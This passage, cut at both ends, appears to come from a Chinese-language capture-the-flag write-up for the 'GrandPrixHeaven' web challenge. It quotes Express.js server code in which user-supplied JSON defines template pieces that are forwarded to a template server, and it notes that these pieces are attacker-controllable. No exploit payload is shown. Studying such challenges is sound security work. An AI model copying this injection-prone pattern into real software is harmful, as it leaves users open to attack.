style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;faves\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;footer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  };\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edefaultData\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003egrandPrix\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003egrandPrix\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e [\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e] \u003cspan style=\"color:#66d9ef\"\u003eof\u003c/span\u003e Object.\u003cspan style=\"color:#a6e22e\"\u003eentries\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTEMPLATE_PIECES\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eincludes\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etoLowerCase\u003c/span\u003e()) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eisNum\u003c/span\u003e(parseInt(\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e)) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;object\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid template piece\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// don\u0026#39;t be sneaky. We need a CSP!\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (parseInt(\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;csp\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;No CSP\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`ERROR IN /fave/:GrandPrixHeaven:\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e400\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e({ \u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid custom body\u0026#34;\u003c/span\u003e });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eneedle\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epost\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eTEMPLATE_SERVER\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    { \u003cspan style=\"color:#a6e22e\"\u003emultipart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eboundary\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBOUNDARY\u003c/span\u003e },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`ERROR IN /fave/:GrandPrixHeaven:\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e({ \u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003esend\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  );\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我們可以注意到這邊的 template pieces 是可以自己定義的\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edefaultData\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003egrandPrix\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003egrandPrix\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e [\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e] \u003cspan style=\"color:#66d9ef\"\u003eof\u003c/span\u003e Object.\u003cspan style=\"color:#a6e22e\"\u003eentries\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eneedleBody\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTEMPLATE_PIECES\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eincludes\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etoLowerCase\u003c/span\u003e()) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eisNum\u003c/span\u003e(parseInt(\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e)) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;object\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid template piece\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// don\u0026#39;t be sneaky. We need a CSP!\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (parseInt(\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;csp\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;No CSP\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`ERROR IN /fave/:GrandPrixHeaven:\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e400\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e({ \u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid custom body\u0026#34;\u003c/span\u003e });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如何定義就要看新增車的 route\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eapp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epost\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/api/new-car\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eimg_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003econfig_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  };\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003efiles\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003efiles\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eimage\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereqImg\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003efiles\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eimage\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ereqImg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emimetype\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;image/jpeg\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;wrong mimetype\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequest_img\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereqImg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esaved_img\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMedia\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecreate\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eimg\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequest_img\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003epublic_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003enanoid\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003enanoid\u003c/span\u003e(),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eimg_id\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esaved_img\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epublic_id\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esaved_config\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eConfiguration\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecreate\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eyear\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eyear\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003emake\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emake\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003emodel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emodel\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003epublic_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003enanoid\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003enanoid\u003c/span\u003e(),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eimg_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eimg_id\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 